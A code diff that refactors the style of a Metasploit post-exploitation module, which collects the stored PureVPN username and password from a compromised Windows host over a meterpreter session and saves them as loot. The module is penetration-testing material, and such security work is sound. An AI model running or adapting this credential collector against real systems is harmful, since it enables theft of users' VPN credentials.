@@ -7,50 +7,63 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
 
   def initialize(info = {})
-    super(update_info(info,
-        'Name'          => 'Windows Gather PureVPN Client Credential Collector',
-        'Description'   => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather PureVPN Client Credential Collector',
+        'Description' => %q{
           Finds the password stored for the PureVPN Client.
         },
-        'References'     =>
-        [
+        'References' => [
           ['URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/Credential-Leak-Flaws-in-Windows-PureVPN-Client/'],
           ['URL', 'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2018-010/?fid=11779']
         ],
-        'License'       => MSF_LICENSE,
-        'Author'        => ['Manuel Nader #AgoraSecurity'],
-        'Platform'      => ['win'],
-        'Arch'          => [ARCH_X86, ARCH_X64],
-        'SessionTypes'  => ['meterpreter']
-    ))
+        'License' => MSF_LICENSE,
+        'Author' => ['Manuel Nader #AgoraSecurity'],
+        'Platform' => ['win'],
+        'Arch' => [ARCH_X86, ARCH_X64],
+        'SessionTypes' => ['meterpreter'],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_fs_ls
+              stdapi_registry_query_value_direct
+              stdapi_sys_config_getenv
+            ]
+          }
+        }
+      )
+    )
 
-    register_options(
+    register_options([
       # In case software is installed in a rare directory
-      [OptString.new('RPATH', [false, 'Path of the PureVPN Client installation'])
+      OptString.new('RPATH', [false, 'Path of the PureVPN Client installation'])
     ])
   end
 
   def run
-    if session.type != 'meterpreter'
-      print_error ('Only meterpreter sessions are supported by this post module')
-      return
-    end
+    fail_with(Failure::BadConfig, 'Only meterpreter sessions are supported by this module') unless session.type == 'meterpreter'
 
     locations = get_locations
     content = get_content(locations)
-    if content && content !~ /^\-1\r\n$/
+    if content && content !~ /^-1\r\n$/
       get_client_creds(content)
     else
-      print_status("No username/password found")
+      print_status('No username/password found')
     end
   end
 
   def get_locations
     progfiles_env = session.sys.config.getenvs('ProgramData')
     locations = []
-    progfiles_env.each do |_k, v|
+    progfiles_env.each_value do |v|
       vprint_status("Searching PureVPN Client installation at #{v}")
-      if session.fs.dir.entries(name = v).include? 'purevpn'
+      if session.fs.dir.entries(v).include? 'purevpn'
         vprint_status("Found PureVPN Client installation at #{v}")
         locations << v + '\\purevpn\\config\\'
       end
@@ -84,7 +97,7 @@ class MetasploitModule < Msf::Post
       vprint_status("Checking for login configuration at: #{location}")
       begin
         files = session.fs.dir.entries(location)
-        files.map{|i| i.downcase}.uniq
+        files.map(&:downcase).uniq
         if files.include?(datfile)
           filepath = location + datfile
           print_status("Configuration file found: #{filepath}")
@@ -103,7 +116,7 @@ class MetasploitModule < Msf::Post
 
   def parse_file(data)
     username, password = data.split("\r\n")
-    creds  = {'username' => username, 'password' => password}
+    creds = { 'username' => username, 'password' => password }
     print_good('Collected the following credentials:')
     print_good("    Username: #{username}")
     print_good("    Password: #{password}")
@@ -113,21 +126,18 @@ class MetasploitModule < Msf::Post
 
   def report_cred(creds)
     # report the goods!
-    loot_path = store_loot('PureVPN.creds', 'text/xml', session, creds.to_xml,
-      'purevpn_credentials.xml', 'PureVPN Credentials')
+    loot_path = store_loot(
+      'PureVPN.creds',
+      'text/xml',
+      session,
+      creds.to_xml,
+      'purevpn_credentials.xml',
+      'PureVPN Credentials'
+    )
     print_status("PureVPN credentials saved in: #{loot_path}")
   end
 
   def get_client_creds(data)
-    credentials = Rex::Text::Table.new(
-      'Header'    => 'PureVPN Client Credentials',
-      'Indent'    => 1,
-      'Columns'   =>
-      [
-        'Username',
-        'Password'
-      ])
-    result = parse_file(data)
-    report_cred(result)
+    report_cred(parse_file(data))
   end
 end
